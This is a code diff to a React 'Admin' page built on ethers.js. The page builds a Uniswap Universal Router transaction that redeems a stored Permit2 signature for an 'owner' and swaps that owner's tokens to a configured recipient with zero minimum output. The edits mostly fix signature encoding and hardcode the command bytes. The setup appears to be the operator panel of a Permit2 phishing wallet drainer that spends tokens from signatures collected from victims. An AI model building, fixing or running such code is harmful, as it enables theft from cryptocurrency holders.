@@ -5,27 +5,27 @@ import { BrowserProvider, Contract, ethers } from 'ethers';
 import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 // -----------------------------
-// Constants & ABI
+// Constants
 // -----------------------------
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
-  "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable" // Ensure correct signature match
+  "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable"
 ];
 
-const COMMANDS = {
-  PERMIT2_PERMIT: 0x02,
-  V3_SWAP_EXACT_IN: 0x08
-};
-
 // -----------------------------
-// Helper: Build Transaction Data
+// Helper: Robust Signature Builder
 // -----------------------------
 function buildSignatureBytes(r, s, vRaw) {
-  let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
+  // 1. Ensure v is a number and adjust valid range (27/28)
+  let v = Number(vRaw);
   if (v === 0 || v === 1) v += 27;
-  const vHex = ethers.hexlify(v);
+  
+  // 2. Convert to hex string explicitly (e.g., 27 -> "0x1b")
+  // explicit string conversion avoids Ethers "invalid BytesLike" on small numbers
+  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
+
+  // 3. Ensure r and s are formatted correctly
   return ethers.hexConcat([r, s, vHex]);
 }
 
@@ -34,9 +34,13 @@ function buildUniversalRouterTx(data, settings) {
   const { recipient, outputToken } = settings;
 
   const amountBn = BigInt(amount);
+  
+  // Build the signature bytes using the safe helper
   const signatureBytes = buildSignatureBytes(r, s, v);
+
   const permitAbi = new ethers.AbiCoder();
 
+  // PermitSingle struct construction
   const permitSingleTuple = [
     [
       [token, amountBn, Number(deadline), Number(nonce)],
@@ -46,6 +50,7 @@ function buildUniversalRouterTx(data, settings) {
     signatureBytes
   ];
 
+  // Encode Permit2 inputs
   const permitInput = permitAbi.encode(
     ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
     [owner, permitSingleTuple[0], permitSingleTuple[1]]
@@ -60,9 +65,10 @@ function buildUniversalRouterTx(data, settings) {
     return '0x' + hex;
   }
   
-  // Path: Input Token -> Fee -> Output Token
+  // Build Swap Path
   const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
   
+  // Encode V3 Swap inputs
   const minReceived = BigInt(0); 
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
@@ -70,10 +76,13 @@ function buildUniversalRouterTx(data, settings) {
     [path, amountBn, minReceived, recipient]
   );
 
-  const commands = ethers.hexConcat([
-    ethers.hexlify(COMMANDS.PERMIT2_PERMIT).slice(0, 4),
-    ethers.hexlify(COMMANDS.V3_SWAP_EXACT_IN).slice(0, 4)
-  ]);
+  // -----------------------------
+  // COMMANDS FIX: Hardcoded Hex String
+  // -----------------------------
+  // 0x02 = PERMIT2_PERMIT
+  // 0x08 = V3_SWAP_EXACT_IN
+  // We use a manual string to ensure it's treated as valid bytes, avoiding 'invalid BytesLike' errors on numbers.
+  const commands = "0x0208"; 
 
   const inputs = [permitInput, swapInput];
   const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 mins
@@ -155,14 +164,14 @@ export default function Admin() {
       
       setStatusMsg("Simulating...");
       
-      // Estimate gas
+      // Estimate Gas
       let gasLimit;
       try {
         const est = await router.execute.estimateGas(txData.commands, txData.inputs, txData.execDeadline, { value: 0 });
         gasLimit = (est * 120n) / 100n; 
       } catch (e) {
         console.warn("Gas estimate failed, using fallback.", e);
-        gasLimit = 3000000n; 
+        gasLimit = 3000000n; // Fallback gas limit
       }
 
       setStatusMsg("Please Sign in Wallet...");
